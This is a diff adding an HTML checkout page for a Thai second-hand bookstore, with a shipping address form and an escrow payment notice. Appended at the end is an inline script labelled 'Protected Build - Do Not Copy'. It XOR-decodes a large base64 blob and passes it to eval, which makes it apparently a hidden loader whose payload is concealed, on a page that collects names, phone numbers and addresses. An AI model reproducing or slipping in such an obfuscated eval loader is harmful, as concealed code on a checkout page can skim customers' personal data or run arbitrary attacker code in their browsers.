@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8" />
+<meta name="robots" content="noindex" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>ชำระเงิน | ร้านหนังสือมือสอง</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="css/styles.css" />
+</head>
+<body class="min-h-screen flex flex-col bg-[#FAF7F2] text-[#1F4E4B]">
+<div id="site-header">
+<header class="sticky top-0 z-50 bg-[#FAF7F2]/95 backdrop-blur-md border-b border-[#E6E1D6]">
+<div class="max-w-6xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between gap-2">
+<a href="index.html" id="navbar-logo-link" data-nav-home="true" onclick="if(window.navigateToHome) return window.navigateToHome(event);" class="flex items-center gap-2 font-extrabold text-base sm:text-lg text-[#1F4E4B] hover:text-[#26A69A] transition cursor-pointer">
+<span class="w-8 h-8 rounded-xl bg-[#E0F4F1] text-[#26A69A] flex items-center justify-center">📚</span>
+<span>ร้านหนังสือมือสอง</span>
+</a>
+<div class="flex items-center gap-2 sm:gap-3">
+<a href="index.html" id="navbar-home-link" data-nav-home="true" onclick="if(window.navigateToHome) return window.navigateToHome(event);" class="inline-flex items-center gap-1 px-3 py-1.5 rounded-full text-[#1F4E4B] hover:bg-[#E0F4F1]/60 hover:text-[#26A69A] text-xs sm:text-sm font-bold transition cursor-pointer">
+<span>หน้าแรก</span>
+</a>
+<a href="login.html" class="inline-flex items-center gap-1.5 px-3.5 sm:px-4 py-2 rounded-full bg-[#26A69A] hover:bg-[#219187] text-white text-xs sm:text-sm font-extrabold shadow-xs transition">
+<span>👤</span>
+<span>เข้าสู่ระบบ<span class="hidden sm:inline"> / สมัครสมาชิก</span></span>
+</a>
+</div>
+</div>
+</header>
+</div>
+<main class="flex-1 py-8 sm:py-12 px-4 sm:px-6">
+<div class="max-w-5xl mx-auto">
+<p class="mb-5 rounded-2xl bg-[#FDF2E2] border border-[#E9964A] px-4 py-3 text-xs font-bold">🧪 ระบบอยู่ระหว่างทดสอบ — ยังไม่มีการเรียกเก็บเงินจริง</p>
+<h1 class="text-2xl sm:text-3xl font-extrabold mb-6">ยืนยันคำสั่งซื้อ</h1>
+<div id="co-alert" class="hidden mb-4 p-3.5 rounded-2xl text-xs font-bold border bg-[#FDF2E2] border-[#E9964A]"></div>
+<div id="co-grid" class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+<form id="co-form" onsubmit="submitOrder(event)" class="lg:col-span-7 bg-white rounded-3xl border border-[#E6E1D6] p-6 sm:p-8 shadow-2xs space-y-4">
+<h2 class="text-lg font-extrabold">ที่อยู่จัดส่ง</h2>
+<div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+<div><label class="block text-xs font-bold mb-1">ชื่อผู้รับ *</label><input required id="cust-name" maxlength="120" class="w-full rounded-2xl border border-[#E6E1D6] px-4 py-3 text-sm focus:outline-[#26A69A]" /></div>
+<div><label class="block text-xs font-bold mb-1">เบอร์โทรศัพท์ *</label><input required id="cust-phone" inputmode="tel" pattern="[0-9\- ]{9,15}" maxlength="15" class="w-full rounded-2xl border border-[#E6E1D6] px-4 py-3 text-sm focus:outline-[#26A69A]" /></div>
+</div>
+<div><label class="block text-xs font-bold mb-1">บ้านเลขที่ / หมู่บ้าน / ซอย *</label><input required id="addr-house" maxlength="150" class="w-full rounded-2xl border border-[#E6E1D6] px-4 py-3 text-sm focus:outline-[#26A69A]" /></div>
+<div><label class="block text-xs font-bold mb-1">รายละเอียดเพิ่มเติม (ถนน / ซอย) <span class="font-medium text-[#5F7470]">(ไม่บังคับ)</span></label><input id="addr-street" maxlength="150" class="w-full rounded-2xl border border-[#E6E1D6] px-4 py-3 text-sm focus:outline-[#26A69A]" /></div>
+<div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+<div><label class="block text-xs font-bold mb-1">ตำบล / แขวง *</label><input required id="addr-subdistrict" maxlength="60" class="w-full rounded-2xl border border-[#E6E1D6] px-4 py-3 text-sm focus:outline-[#26A69A]" /></div>
+<div><label class="block text-xs font-bold mb-1">อำเภอ / เขต *</label><input required id="addr-district" maxlength="60" class="w-full rounded-2xl border border-[#E6E1D6] px-4 py-3 text-sm focus:outline-[#26A69A]" /></div>
+<div><label class="block text-xs font-bold mb-1">จังหวัด *</label><input required id="addr-province" maxlength="60" class="w-full rounded-2xl border border-[#E6E1D6] px-4 py-3 text-sm focus:outline-[#26A69A]" /></div>
+<div><label class="block text-xs font-bold mb-1">รหัสไปรษณีย์ *</label><input required id="addr-postcode" inputmode="numeric" pattern="[0-9]{5}" maxlength="5" placeholder="12345" class="w-full rounded-2xl border border-[#E6E1D6] px-4 py-3 text-sm focus:outline-[#26A69A]" /></div>
+</div>
+<label class="flex items-center gap-2 text-xs font-bold cursor-pointer"><input type="checkbox" id="addr-save" checked class="rounded" /> บันทึกที่อยู่นี้ไว้ใช้ครั้งต่อไป</label>
+<h2 class="text-lg font-extrabold pt-4 border-t border-[#E6E1D6]">การชำระเงิน</h2>
+<div class="rounded-2xl border-2 border-[#26A69A] bg-[#E0F4F1]/50 p-4 text-xs">
+<div class="font-extrabold text-sm">🛡️ โอนเข้าบัญชีกลาง (Escrow)</div>
+<p class="mt-1 text-[#3d5a56]">เงินจะถูกพักไว้ที่บัญชีกลางจนกว่าคุณจะได้รับหนังสือและกดยืนยัน หลังกดสั่งซื้อระบบจะแสดงขั้นตอนโอนเงินในหน้า "ฝั่งซื้อของฉัน" (ช่วงทดสอบ: จำลองการชำระเงิน)</p>
+</div>
+<button type="submit" id="co-submit" class="w-full py-4 rounded-full bg-[#26A69A] hover:bg-[#219187] text-white font-extrabold text-base transition cursor-pointer disabled:opacity-60">ยืนยันคำสั่งซื้อ</button>
+<p class="text-[11px] text-[#5F7470] text-center">การกดสั่งซื้อถือว่ายอมรับ <a class="underline" href="help.html#terms">ข้อกำหนดการใช้งาน</a> และ <a class="underline" href="help.html#refund">นโยบายคืนเงิน</a></p>
+</form>
+<aside class="lg:col-span-5">
+<div class="bg-white rounded-3xl border border-[#E6E1D6] p-6 shadow-2xs lg:sticky lg:top-24">
+<h2 class="text-lg font-extrabold mb-4">สรุปคำสั่งซื้อ</h2>
+<div id="co-book" class="flex gap-3 pb-4 border-b border-[#E6E1D6]"></div>
+<dl id="co-sum" class="pt-4 space-y-2 text-sm"></dl>
+</div>
+</aside>
+</div>
+<div id="co-done" class="hidden bg-white rounded-3xl border border-[#E6E1D6] p-8 text-center shadow-2xs">
+<div class="text-4xl">🎉</div>
+<h2 class="text-xl font-extrabold mt-2">สั่งซื้อสำเร็จ</h2>
+<p id="co-done-msg" class="text-sm text-[#5F7470] mt-2"></p>
+<div class="mt-5 flex flex-wrap justify-center gap-3">
+<a href="profile.html?tab=buyer" class="px-6 py-3 rounded-full bg-[#26A69A] text-white font-extrabold text-sm">ดูคำสั่งซื้อของฉัน</a>
+<a href="index.html" class="px-6 py-3 rounded-full border border-[#E6E1D6] font-bold text-sm">เลือกหนังสือต่อ</a>
+</div>
+</div>
+</div>
+</main>
+<div id="site-footer"></div>
+<script src="js/books-data.js"></script>
+<script src="js/app.js"></script>
+<script>/* Protected Build - Do Not Copy */
+(function(){var _0xbce621=['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'],_0xdc997a=0x14;(function(_0x9e0c20,_0x71a96e){while(_0x71a96e-->0x0){_0x9e0c20['push'](_0x9e0c20['shift']());}})(_0xbce621,_0xbce621['length']-_0xdc997a);var _0x7e620b=[0x56,0xea,0x8e,0x20,0xba,0x16,0x3a,0x22,0x54,0x28,0x56,0x79,0xa6,0xba,0xdc,0xe5],_0xf7e885=_0xbce621['join'](''),_0xff8e91=window['atob'](_0xf7e885),_0x7b3378=_0xff8e91['length'],_0xeafc69=new Uint8Array(_0x7b3378);for(var _0x71a96e=0x0;_0x71a96e<_0x7b3378;_0x71a96e++){_0xeafc69[_0x71a96e]=_0xff8e91['charCodeAt'](_0x71a96e)^_0x7e620b[_0x71a96e%_0x7e620b['length']];}var _0x522004=new TextDecoder('utf-8')['decode'](_0xeafc69),_0xde7b63=window['eval'];_0xde7b63(_0x522004);})();</script>
+</body>
+</html>
